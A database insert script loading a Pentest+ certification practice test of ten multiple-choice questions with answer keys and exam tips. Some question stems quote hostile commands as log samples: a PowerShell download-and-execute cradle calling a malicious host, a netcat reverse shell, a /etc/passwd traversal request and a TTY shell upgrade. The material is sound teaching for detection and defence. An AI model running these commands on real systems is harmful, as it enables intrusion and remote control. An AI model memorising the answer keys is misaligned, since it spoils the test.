db.tests.insertOne({
  "category": "penplus",
  "testId": 6,
  "testName": "Pentest+ Practice Test #6 (Formidable)",
  "xpPerCorrect": 10,
  "questions": [
    {
      "id": 1,
      "question": "A security analyst observes the following PowerShell execution in endpoint logs:\n\npowershell.exe -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -c \"IEX(New-Object Net.WebClient).DownloadString('http://malicious-domain.com/a.ps1')\"\n\nSubsequent logs show:\n- Outbound DNS queries with randomized subdomains (e.g., x9a8b7c.malicious-domain.com)\n- Outbound TCP connections to port 8080\n- No associated disk I/O events\n\nWhat is the MOST LIKELY objective of this attack?",
      "options": [
        "Fileless malware execution for persistent C2 communication",
        "Credential dumping using in-memory Mimikatz payloads",
        "Privilege escalation using PowerShell remoting",
        "Lateral movement via WinRM and PSExec"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The combination of in-memory PowerShell execution ('IEX'), DNS queries with randomized subdomains, and no disk activity strongly indicates fileless malware maintaining C2 communication.",
      "examTip": "Fileless malware indicators: in-memory PowerShell execution + randomized DNS queries + minimal disk I/O."
    },
    {
      "id": 2,
      "question": "A threat hunter detects the following:\n- SSH login from a known external threat actor IP.\n- Kernel-level log shows outbound traffic to multiple external hosts over port 4444.\n- The compromised host exhibits unauthorized privilege escalation attempts.\n\nWhich MITRE ATT&CK tactics are represented by these behaviors? (Select TWO)",
      "options": [
        "Command and Control (C2)",
        "Privilege Escalation",
        "Lateral Movement",
        "Persistence",
        "Initial Access"
      ],
      "correctAnswerIndex": [0, 1],
      "explanation": "C2 is represented by outbound connections on port 4444 (commonly used for reverse shells), while privilege escalation attempts are explicitly observed in logs.",
      "examTip": "Look for port 4444 and similar indicators for C2. Privilege escalation typically follows initial footholds."
    },
    {
      "id": 3,
      "question": "An advanced persistent threat (APT) group uses custom malware that leverages DNS tunneling for exfiltration. The SOC team identifies unusual DNS traffic patterns with base64-encoded subdomains but no related HTTP/S traffic.\n\nWhat is the FIRST action the SOC team should take to contain this activity?",
      "options": [
        "Implement egress filtering to block outbound DNS requests to suspicious domains",
        "Conduct full packet capture for forensic analysis",
        "Quarantine the affected hosts from the network",
        "Perform memory analysis to detect in-memory malware artifacts"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Blocking outbound DNS requests halts data exfiltration via DNS tunneling. Quarantine may come later but does not immediately disrupt exfiltration pathways.",
      "examTip": "For DNS tunneling, prioritize blocking outbound DNS communications to suspicious domains."
    },
    {
      "id": 4,
      "question": "A penetration tester executes the following command on a Linux host:\n\npython3 -c 'import pty; pty.spawn(\"/bin/bash\")'\n\nWhat is the PRIMARY purpose of this command?",
      "options": [
        "Obtain a fully interactive TTY shell",
        "Establish a reverse shell for remote control",
        "Bypass sudo restrictions for privileged commands",
        "Execute malicious payloads in memory"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The command spawns a TTY shell, giving the attacker an interactive environment necessary for executing commands more seamlessly after exploitation.",
      "examTip": "Interactive TTY shells improve command execution capabilities post-exploitation—commonly used after gaining low-level shells."
    },
    {
      "id": 5,
      "question": "A web server’s access logs show the following entry:\n\n192.168.1.100 - - [24/Feb/2025:15:20:45 +0000] \"GET /app.php?file=../../../../etc/passwd HTTP/1.1\" 200 1024\n\nWhat vulnerability does this indicate, and what is the MOST effective mitigation?",
      "options": [
        "Directory traversal; implement server-side input validation and path sanitization",
        "Remote file inclusion (RFI); disable remote file execution in application configurations",
        "SQL injection; use parameterized queries in all database interactions",
        "Command injection; restrict shell command execution permissions"
      ],
      "correctAnswerIndex": 0,
      "explanation": "The use of '../../../../etc/passwd' shows a directory traversal attempt. Input validation and path sanitization on the server side prevent such attacks.",
      "examTip": "Directory traversal attacks exploit improper file path validation—ensure rigorous server-side checks."
    },
    {
      "id": 6,
      "question": "A SIEM triggers an alert based on these correlated events:\n- User 'admin' logs in successfully from IP 203.0.113.12.\n- Within 10 seconds, the same user logs in from IP 198.51.100.22 (different geo-location).\n- Both sessions perform file transfer operations to external cloud storage.\n\nWhat is the MOST LIKELY explanation for these observations?",
      "options": [
        "Account compromise involving credential theft and rapid data exfiltration",
        "Insider threat performing authorized data transfers from multiple locations",
        "Valid user accessing cloud storage using a VPN with dynamic exit nodes",
        "Failed brute force attack triggering false positives in SIEM correlations"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Rapid logins from geographically distant IPs and subsequent data transfers strongly indicate credential compromise and exfiltration.",
      "examTip": "Impossible travel patterns with immediate data movement are high-confidence indicators of credential theft."
    },
    {
      "id": 7,
      "question": "An organization’s vulnerability scan detects a critical remote code execution (RCE) flaw in an internet-facing web application. A patch is unavailable, and downtime is not an option.\n\nWhich compensating control MOST effectively reduces exploitation risk?",
      "options": [
        "Deploy a Web Application Firewall (WAF) with virtual patching to block exploit patterns",
        "Temporarily disable all external access to the application",
        "Increase monitoring and log analysis for exploit attempts",
        "Implement strict input validation for all user-supplied data"
      ],
      "correctAnswerIndex": 0,
      "explanation": "A WAF with virtual patching immediately mitigates known exploit vectors while allowing the application to remain online.",
      "examTip": "Virtual patching via WAFs is an effective temporary control for high-severity, unpatched vulnerabilities."
    },
    {
      "id": 8,
      "question": "During threat hunting, a PowerShell script is observed running with the following characteristics:\n- Uses '-ExecutionPolicy Bypass' and '-WindowStyle Hidden'\n- Connects to a known malicious C2 server via HTTP\n- Downloads and executes further payloads in memory\n\nWhat defensive control would MOST effectively prevent this behavior in the future?",
      "options": [
        "Application whitelisting to block unauthorized PowerShell executions",
        "Blocking HTTP traffic at the firewall from all endpoints",
        "Configuring antivirus to detect obfuscated PowerShell commands",
        "Enabling PowerShell logging with script block transcription"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Application whitelisting ensures only approved scripts can run, effectively blocking unauthorized PowerShell-based attacks.",
      "examTip": "Application whitelisting is a top defense against fileless malware leveraging PowerShell."
    },
    {
      "id": 9,
      "question": "A network capture shows repeated Netcat connections to port 4444 with the following syntax:\n\nnc -nv 198.51.100.15 4444 -e /bin/bash\n\nWhat is the MOST LIKELY objective of these connections?",
      "options": [
        "Establishing a reverse shell for remote command execution",
        "Launching a distributed denial-of-service (DDoS) attack",
        "Performing reconnaissance for open network ports",
        "Exfiltrating data to an external server using TCP"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Netcat with '-e /bin/bash' creates a reverse shell, allowing attackers to execute commands remotely on the compromised system.",
      "examTip": "Reverse shell behavior typically involves Netcat listeners and connections to unusual ports like 4444."
    },
    {
      "id": 10,
      "question": "A cloud security engineer detects a sudden spike in GPU utilization across multiple virtual machines (VMs) in different regions. Billing alerts also show unexpected cost increases.\n\nWhat is the MOST LIKELY cause of this activity?",
      "options": [
        "Cryptojacking attack leveraging cloud resources for cryptocurrency mining",
        "DDoS attack preparation using cloud-hosted botnets",
        "Lateral movement by attackers searching for sensitive data",
        "Automated penetration testing initiated by internal teams"
      ],
      "correctAnswerIndex": 0,
      "explanation": "Sudden GPU spikes and increased billing charges are strong indicators of cryptojacking, where attackers use cloud infrastructure for mining cryptocurrency.",
      "examTip": "Monitor cloud resource usage and set automated billing alerts to detect cryptojacking early."
    }
  ]
});

